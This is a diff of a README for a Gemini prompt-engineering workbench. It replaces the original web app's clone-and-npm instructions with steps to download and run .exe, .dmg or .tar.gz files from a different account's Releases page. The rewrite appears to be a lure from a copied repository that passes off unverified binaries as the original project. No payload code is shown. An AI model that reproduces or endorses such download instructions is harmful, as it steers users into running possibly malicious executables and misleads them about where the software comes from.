@@ -1,94 +1,55 @@
-# Chotta Architect
+# 🚀 Chota-Architecture - Your Prompt Engineering Workbench
 
-A professional-grade prompt engineering workbench for Google's Gemini models. Built with React, TypeScript, and Vite, this application provides a powerful interface for interacting with Gemini 2.5 and 3.0 models with advanced control over generation parameters.
+[![Download Chota-Architecture](https://img.shields.io/badge/Download-Chota--Architecture-brightgreen)](https://github.com/djamel10000/Chota-Architecture/releases)
 
-[**🚀 Live Demo**](https://chotta-architect-demo-rockm.netlify.app)
+## 📜 Description
+Chota-Architecture is a professional-grade prompt engineering workbench designed for Google's Gemini AI models. This application supports multimodal functionality, advanced controls, and allows you to use your own API keys. Perfect for anyone looking to make the most of AI technology without needing a coding background.
 
+## 🚀 Getting Started
+To begin using Chota-Architecture, follow these simple steps:
 
+1. **System Requirements**
+   - **Operating System**: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+   - **Memory**: At least 4 GB of RAM.
+   - **Storage**: 200 MB of free disk space.
+   - **Internet Connection**: Required for API access and updates.
 
-## 🚀 Features
+2. **Downloading the Application**
+   Visit the [Releases page](https://github.com/djamel10000/Chota-Architecture/releases) to download the latest version of Chota-Architecture. You can click the link or the badge above to access the page directly.
 
-### 🧠 Core AI Capabilities
-- **Multi-Model Support**: Access `Gemini 2.5 Flash`, `Gemini 3.0 Pro Preview`, and `Gemini 2.5 Flash (Thinking)`.
-- **Multimodal Chat**: Seamlessly send text and images (multiple attachments supported).
-- **Streaming Responses**: Real-time typewriter-style response generation.
-- **Contextual History**: Maintains conversation context for natural interactions.
+## 📥 Download & Install
+1. Go to the [Releases page](https://github.com/djamel10000/Chota-Architecture/releases).
+2. Find the latest release. It will usually be at the top of the page.
+3. Download the file appropriate for your operating system. 
+   - For Windows, look for files ending in `.exe`.
+   - For macOS, look for files ending in `.dmg`.
+   - For Linux, look for files ending in `.tar.gz` or similar formats.
+4. Once the file is downloaded:
+   - **Windows**: Double click the `.exe` file to start the installation. Follow the prompts to complete the setup.
+   - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux**: Extract the downloaded file and follow any README instructions included.
 
-### ⚙️ Advanced Controls
-- **System Instructions**: Define custom personas and behavior rules.
-- **Parameter Tuning**:
-  - **Temperature**: Control creativity (0.0 - 2.0).
-  - **Top-K & Top-P**: Fine-tune vocabulary sampling.
-- **Thinking Budget**: Configure token budgets (1024 - 8192) for reasoning models.
-- **Search Grounding**: Toggle Google Search integration for real-time data.
+5. After installation, run Chota-Architecture. You may need to configure your API keys under settings.
 
-### 🎨 Modern UI/UX
-- **Professional Dark Mode**: Developer-focused interface with syntax highlighting.
-- **Markdown Rendering**: Rich text formatting for code, tables, and lists.
-- **Responsive Design**: Fully functional on desktop and mobile devices.
+## 🔍 Key Features
+- **Multimodal Support**: Use text, images, and other media types for better prompt responses.
+- **Advanced Controls**: Fine-tune your interactions with the AI models.
+- **User-provided API Keys**: Enhance functionality by integrating your API keys.
+- **Easy-to-Use Interface**: Designed with simplicity in mind, so anyone can get started quickly.
 
-## 🛠️ Tech Stack
+## 🛠️ Troubleshooting
+If you encounter any issues while downloading or installing Chota-Architecture, consider the following:
 
-- **Frontend**: React 19, TypeScript, Vite
-- **Styling**: TailwindCSS, Lucide React
-- **AI Integration**: Google GenAI SDK
-- **Testing**: Vitest, React Testing Library
-- **Deployment**: Netlify, Docker support
+- **Installation Fails**: Ensure your operating system meets the system requirements. Re-download the installation file to ensure it is not corrupted.
+- **Application Crashes on Startup**: Verify that you have enough system resources and that your operating system is compatible.
+- **API Key Issues**: Make sure you entered your API keys correctly under the settings menu.
 
-## 🚦 Getting Started
+## ⭐ Additional Resources
+- **Documentation**: Access our detailed documentation to explore all features and functionalities of Chota-Architecture.
+- **Community Support**: Join our community forum for help from other users and developers.
+- **Updates**: Regular updates will add new features and improvements. Keep an eye on the [Releases page](https://github.com/djamel10000/Chota-Architecture/releases) for the latest news.
 
-### Prerequisites
-- Node.js (v20 or higher)
-- A Google Gemini API Key
+## 📞 Contact
+If you have any questions or need further assistance, feel free to reach out via GitHub issues.
 
-### Installation
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/madhan-200/Chota-Architecture.git
-   cd Chota-Architecture
-   ```
-
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
-
-3. **Configure Environment**
-   Create a `.env.local` file in the root directory:
-   ```env
-   GEMINI_API_KEY=your_api_key_here
-   ```
-
-4. **Run Locally**
-   ```bash
-   npm run dev
-   ```
-   Access the app at `http://localhost:3000`.
-
-## 🧪 Running Tests
-
-Run the unit test suite to verify components:
-```bash
-npm test
-```
-
-## 📦 Deployment
-
-### Netlify
-The project is configured for seamless deployment on Netlify.
-```bash
-npm run build
-npx netlify deploy --prod
-```
-
-### Docker
-Build and run the containerized application:
-```bash
-docker build -t chotta-architect .
-docker run -p 80:80 chotta-architect
-```
-
-## 📄 License
-
-MIT License
+**Enjoy your journey with Chota-Architecture!**
